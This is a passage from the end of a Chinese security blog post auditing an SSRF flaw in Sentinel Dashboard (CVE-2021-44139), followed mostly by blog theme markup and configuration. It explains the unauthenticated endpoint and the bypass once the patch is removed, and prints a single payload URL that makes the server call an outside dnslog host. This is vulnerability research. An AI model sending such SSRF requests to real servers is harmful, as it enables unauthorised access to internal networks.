+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716135522352.png" alt="image-20240716135522352"></p>
+<p>当缺少了这几行代码，直接会绕过IP限制，可以打入任意域名或IP#截断进行攻击</p>
+<p>同时还有个问题，为什么这个接口是未授权，全局搜索接口找到了原因</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716140537872.png" alt="image-20240716140537872"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>注释掉补丁的修复代码</p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716135815740.png" alt="image-20240716135815740"></p>
+<p>重新打入payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.80.28:8080/registry/machine?app=1&amp;appType=1&amp;version=1&amp;v=1&amp;hostname=1&amp;ip=4znol4.dnslog.cn&amp;port=80</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716140106963.png" alt="image-20240716140106963"></p>
+<p><img src="/Sentinel-Dashboard-SSRF%EF%BC%88CVE-2021-44139%EF%BC%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240716135959935.png" alt="image-20240716135959935"></p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/avatar.png" alt="tpaer">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>tpaer
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/posts/2490687057.html" target="_blank">Sentinel Dashboard SSRF（CVE-2021-44139）代码审计</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>nice or terrible.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="" target="_blank"></a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="/category/web/">web</a>
+                        
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/posts/3123739478.html" class="prev-prefix">« </a> 上一篇：    <a href="/posts/3123739478.html" title="发布于 2024-07-22 08:37">HooK的多种方式</a>
+                        <br>
+                    
+                    
+                        <a href="/posts/2817504468.html" class="next-prefix">» </a> 下一篇：    <a href="/posts/2817504468.html" title="发布于 2024-07-02 03:15">Jspxcms的代码审计</a>
+                    
+                </div>
+            </div>
+             
+        </div>
+    
+</div>
+    <div id="footer">
+    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>hello</div><div>&copy; 2023-2077 tpaer. All Rights Reserved.</div>
+</div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>Tpaer Blog</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/avatar.png">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user">
+                        
+                            <a href="https://onetpaer.github.io" target="_blank"><span>tpaer</span></a>
+                        
+                    </div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="GitHub" href="https://github.com/onetpaer" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+    
+    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+    <script type="text/javascript" src="/js/APlayer.min.js"></script>
+    <script type="text/javascript" src="/js/Meting.min.js"></script>
+    <script>
+        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+    </script>
+    <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+
+    <div class="wrap-right">
+    <div class="wrap-right-hide">
+         <div class="wrap-right-button favorites">
+            <div class="iconbox" switch="false">
+                <span class="iconfont icon-favorites"></span>
+            </div>
+            <span class="icontext">关注</span>
+         </div>
+        <div class="wrap-right-button search">
+            <div class="iconbox">
+                <span class="iconfont icon-search-menu"></span>
+            </div>
+            <span class="icontext">搜索</span>
+        </div>
+        <div class="wrap-right-button menu-button">
+            <div class="iconbox">
+                <span class="iconfont icon-menu"></span>
+            </div>
+            <span class="icontext">菜单</span>
+        </div>
+        <div class="wrap-right-button mode">
+            <div class="light">
+                <div class="iconbox">
+                    <span class="iconfont icon-daymode"></span>
+                </div>
+                <span class="icontext">浅色模式</span>
+            </div>
+            <div class="dark">
+                <div class="iconbox">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                </div>
+                <span class="icontext">深色模式</span>
+            </div>
+        </div>
+        <div class="wrap-right-button bottom">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">跳至底部</span>
+        </div>
+    </div>
+    <div class="wrap-right-show">
+        <div class="wrap-right-button set">
+            <div class="iconbox">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="wrap-right-button top">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+</div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "onetpaer",
+        GitHubRepositories : "hacker-note",
+
+        User             : "tpaer",
+        UserAvatar       : "/image/sidebar/avatar.png",
+        WebsiteStartDate : "2023-01-01",
+        Home             : "https://onetpaer.github.io",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Tpaer BLOG",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) Welcome back!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : {
+            light : "/image/website/logo/tlogo.png",
+            dark  : "/image/website/logo/tlogo.png"
+        },
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/home.png",
+            
+        ],
+        HomeBannerText  : "Cybersecurity",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.png",
+            
+                "/image/header/article3.png",
+            
+                "/image/header/article4.png",
+            
+        ],
+
+        OtherBannerText : "All because of love",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "Tpaer Blog",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/onetpaer",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>hello</div><div>&copy; 2023-2077 tpaer. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Tpaer Blog",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "TIB5V1ZDSN",
+            apiKey        : "eb10299c1d35e47748cf90761834aec4",
+            indexName     : "hack-note",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Comment : {
+            switch : true,
+            type   : "Valine",
+        },
+
+        Waline : {
+            el              : ".comments-content",
+            serverURL       : "",
+            path            : window.location.pathname,
+            meta            : "['nick', 'mail', 'link']",
+            requiredMeta    : "['nick', 'mail']",
+            pageSize        : 10,
+            lang            : "zh-cn",
+            locale: {
+                admin       : "博主",
+                anonymous   : "匿名用户",
+                sofa        : "快来做第一个评论的人吧 ~",
+                placeholder : "你是我一生只会遇见一次的惊喜...",
+            },
+            dark            : "html[color-scheme='dark']",
+            search          : false,
+            pageview        : true,
+            comment         : true,
+            copyright       : false,
+        },
+
+        Valine : {
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            api      : "https://api.i-meto.com/meting/api",
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css",
+            waline           : "/css/waline.css",
+            walineCustom     : "/css/waline-custom.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js",
+            waline           : "/js/waline.mjs",
+            pageview         : "/js/pageview.mjs",
+            comment          : "/js/comment.mjs",
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "nice or terrible."
+        },
+            
+        Theme : {
+            url  : "",
+            name : ""
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
